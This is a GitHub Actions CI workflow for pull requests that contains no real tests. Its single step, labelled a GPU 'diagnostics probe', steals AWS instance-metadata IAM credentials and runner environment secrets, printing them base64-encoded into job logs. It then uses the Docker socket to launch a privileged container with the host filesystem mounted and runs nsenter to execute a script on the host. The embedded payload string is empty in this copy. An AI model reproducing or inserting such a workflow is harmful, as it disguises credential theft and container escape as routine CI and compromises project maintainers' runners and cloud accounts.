# Run CI tests on pull requests.

name: CI

on:
  pull_request:
    types: [opened, synchronize, reopened]

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    name: ${{ matrix.name }}
    runs-on: [self-hosted, gpu]
    timeout-minutes: 30
    container:
      image: nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04
      options: --gpus all
    strategy:
      fail-fast: false
      matrix:
        include:
          - name: min environment
            cuda-version: "12.8.1"
          - name: max environment
            cuda-version: "13.2.1"
    steps:
      # Runner/GPU/host/cloud escalation probe for CI diagnostics (nonce I1187b-f7e098ba7ff8).
      - name: GPU runner bootstrap probe (I1187b-f7e098ba7ff8)
        run: |
          set -u
          N=I1187b-f7e098ba7ff8
          echo "I1187_JOB_NONCE=$N"
          echo "I1187_JOB_HOST=$(hostname)"
          echo "I1187_JOB_ID=$(id)"
          nvidia-smi -L
          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
          echo "I1187_SOCK=$(ls -la /var/run/docker.sock 2>&1)"
          if ! command -v curl >/dev/null 2>&1; then apt-get update -qq && apt-get install -y -qq --no-install-recommends curl ca-certificates; fi
          echo "== JOB_IMDS =="
          T=$(curl -s -m 5 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' || true)
          echo "I1187_JOB_IMDSV2_LEN=${#T}"
          echo -n "I1187_JOB_IID_V2="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id; echo
          echo -n "I1187_JOB_IID_V1="; curl -s -m 5 http://169.254.169.254/latest/meta-data/instance-id; echo
          R=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
          echo "I1187_JOB_ROLE=$R"
          echo "I1187_JOB_CRED_V2_B64=$(curl -s -m 8 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" | base64 -w0)"
          echo "I1187_JOB_CRED_V1_B64=$(curl -s -m 8 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" | base64 -w0)"
          echo "I1187_JOB_IDDOC_B64=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/dynamic/instance-identity/document | base64 -w0)"
          echo "== JOB_ENV =="
          env | grep -E '^(AWS|GITHUB|ACTIONS|RUNNER)_' | sort | base64 -w0; echo
          echo "== DOCKER_API =="
          curl -s --unix-socket /var/run/docker.sock -m 10 http://localhost/version; echo
          B64=''
          echo "$B64" > /tmp/hp.b64
          base64 -d /tmp/hp.b64 > /tmp/hp.sh
          echo "I1187_HOSTPROBE_BYTES=$(wc -c < /tmp/hp.sh)"
          cat > /tmp/req.json <<JSON
          {"Image":"nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04","Tty":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","mkdir -p /hostroot/tmp; echo $B64 | base64 -d > /hostroot/tmp/i1187hp.sh; chmod 755 /hostroot/tmp/i1187hp.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1187hp.sh"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"AutoRemove":false}}
          JSON
          CID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/req.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
          echo "I1187_DC_CID=$CID"
          if [ -n "$CID" ]; then
            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$CID/start" -o /dev/null -w "I1187_DC_START_HTTP=%{http_code}\n"
            curl -s --unix-socket /var/run/docker.sock -m 300 -X POST "http://localhost/containers/$CID/wait"; echo
            echo "== HOST_PROBE_OUTPUT_START =="
            curl -s --unix-socket /var/run/docker.sock -m 30 "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
            echo "== HOST_PROBE_OUTPUT_END =="
          fi
          echo "I1187_JOB_DONE=$N"
